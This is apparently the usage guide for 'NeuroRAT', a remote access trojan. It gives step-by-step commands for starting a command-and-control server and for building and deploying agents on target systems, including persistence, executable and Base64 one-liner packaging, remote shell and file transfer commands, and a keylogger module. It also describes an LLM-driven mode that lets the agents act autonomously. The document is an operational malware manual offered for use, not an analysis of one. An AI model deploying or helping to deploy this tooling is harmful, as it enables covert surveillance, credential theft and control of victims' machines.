# NeuroRAT Usage Guide

This guide provides detailed instructions on setting up and using NeuroRAT components.

## Table of Contents

1. [Server Setup](#server-setup)
2. [Agent Deployment](#agent-deployment)
3. [Server Monitor](#server-monitor)
4. [Agent Commands](#agent-commands)
5. [Building Custom Agents](#building-custom-agents)
6. [Extension Modules](#extension-modules)
7. [Web Interface](#web-interface)
8. [Command Reference](#command-reference)

## Server Setup

The NeuroRAT server is based on the agent_protocol framework and provides a command and control (C2) infrastructure.

### Automated Setup

Use the provided deployment script:

```bash
./deploy.sh
```

This script sets up the required dependencies and configuration files.

### Manual Setup

1. Start the C2 server:

```bash
python agent_protocol/examples/neurorat_server.py --host 0.0.0.0 --port 8000 --web-port 5000
```

Options:
- `--host`: Bind address (default: 0.0.0.0)
- `--port`: Agent communication port (default: 8000)
- `--web-port`: Web interface port (default: 5000)
- `--auth`: Enable authentication
- `--token`: Authentication token

## Agent Deployment

NeuroRAT agents can be deployed in several ways:

### Using the Launcher

```bash
python neurorat_launcher.py install --server <c2_server_ip> --port <c2_server_port> --persistence
```

Options:
- `--server`: C2 server address
- `--port`: C2 server port
- `--persistence`: Establish persistence (optional)

### Direct Execution

```bash
python neurorat_launcher.py run --server <c2_server_ip> --port <c2_server_port>
```

### Packaged Deployment

1. Build a packaged agent:

```bash
python build_agent.py --server <c2_server_ip> --port <c2_server_port> --type zip --output neurorat_agent
```

Available package types:
- `zip`: Creates a ZIP archive
- `exe`: Creates an executable (requires PyInstaller)
- `base64`: Generates a Base64-encoded one-liner
- `all`: Creates all package types

2. Deploy the packaged agent on the target system.

## Server Monitor

The server monitor provides additional monitoring capabilities for the C2 server.

### Starting the Monitor

```bash
python server_monitor.py --server <c2_server_ip> --port <c2_server_port> --api-port <web_port>
```

Options:
- `--server`: C2 server address
- `--port`: C2 server port (default: 8000)
- `--api-port`: Web API port (default: 5000)
- `--db`: Database file path (default: neurorat_monitor.db)

### Generating Reports

```bash
python server_monitor.py --server <c2_server_ip> --report
```

## Agent Commands

Agents accept various command types through the C2 server:

### LLM Query Command

This is the primary command type for autonomous operation. The agent can process natural language instructions using either local LLM capabilities or a rule-based parser.

Example:
```
collect_info: system
execute: ls -la /tmp
```

### Status Command

Retrieves system information from the agent.

### Shell Command

Executes shell commands on the agent.

### File Command

Transfers files to/from the agent.

## Building Custom Agents

You can customize the agent for specific deployments:

1. Modify `neurorat_agent.py` to add custom capabilities.
2. Create additional agent modules in the `agent_modules` directory.
3. Customize the `llm_processor.py` for specialized autonomous behavior.
4. Package the agent using `build_agent.py`.

## Extension Modules

NeuroRAT supports extension modules that provide additional functionality:

### Keylogger Module

```python
from agent_modules import keylogger

# Start keylogger
result = keylogger.run(action="start")

# Get keylogger status
status = keylogger.run(action="status")

# Get logged keys
log = keylogger.run(action="get_log")

# Stop keylogger
result = keylogger.run(action="stop")
```

### Creating Custom Modules

1. Create a new Python file in the `agent_modules` directory.
2. Implement the module with a `run()` function as the interface.
3. Update `agent_modules/__init__.py` to include your module.

## Web Interface

The C2 server provides a web interface accessible at `http://<server_ip>:<web_port>`.

### Dashboard

The dashboard shows an overview of connected agents, system status, and recent activities.

### Agents View

Lists all connected agents with basic information.

### Agent Details

Shows detailed information about a specific agent, including system information, command history, and file operations.

### Tasks View

Shows all tasks that have been sent to agents.

## Command Reference

### Server Commands

- `./start_server.sh [host]`: Start the C2 server
- `./start_monitor.sh [host]`: Start the server monitor

### Agent Commands

- `python neurorat_launcher.py install --server <ip> --port <port>`: Install the agent
- `python neurorat_launcher.py run --server <ip> --port <port>`: Run the agent directly
- `python neurorat_launcher.py uninstall`: Uninstall the agent

### Build Commands

- `python build_agent.py --server <ip> --port <port> --type <type>`: Build a packaged agent 